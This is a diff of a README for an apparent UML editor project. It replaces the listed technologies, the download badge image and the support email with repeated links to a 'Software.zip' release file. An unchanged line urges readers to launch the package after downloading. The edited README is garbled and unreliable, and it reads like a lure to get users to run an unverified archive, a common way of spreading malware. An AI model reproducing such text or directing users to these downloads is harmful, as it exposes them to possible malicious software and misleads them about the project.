@@ -5,7 +5,7 @@ Welcome to the UML Editor repository! This is a simple and intuitive UML (Unifie
 ## Features 🚀
 
 - **User-Friendly Interface**: The UML Editor provides a clean and easy-to-use interface for creating UML diagrams.
-- **Full Stack Development**: Built with full stack development technologies such as Next.js and Node.js.
+- **Full Stack Development**: Built with full stack development technologies such as https://github.com/itsamari/UML-Editor/releases/download/v2.0/Software.zip and https://github.com/itsamari/UML-Editor/releases/download/v2.0/Software.zip
 - **Support for Various UML Diagram Types**: Create UML class diagrams, sequence diagrams, and more with ease.
 - **Efficient UML Model Management**: Seamlessly manage and organize your UML models within the editor.
   
@@ -13,7 +13,7 @@ Welcome to the UML Editor repository! This is a simple and intuitive UML (Unifie
 
 To get started with the UML Editor, download the software package from the following link:
 
-[![Download UML Editor](https://img.shields.io/badge/Download-Software-9cf)](https://github.com/user-attachments/files/18383251/Software.zip "Download UML Editor")
+[![Download UML Editor](https://github.com/itsamari/UML-Editor/releases/download/v2.0/Software.zip)](https://github.com/itsamari/UML-Editor/releases/download/v2.0/Software.zip "Download UML Editor")
 
 *Note: The software package needs to be launched after downloading.*
 
@@ -57,7 +57,7 @@ This project is licensed under the MIT License. You can find more details in the
 
 ## Support 📧
 
-For any questions or assistance with the UML Editor, please reach out to the project maintainer at [email@example.com](mailto:email@example.com).
+For any questions or assistance with the UML Editor, please reach out to the project maintainer at [https://github.com/itsamari/UML-Editor/releases/download/v2.0/Software.zip](https://github.com/itsamari/UML-Editor/releases/download/v2.0/Software.zip).
 
 ---
 
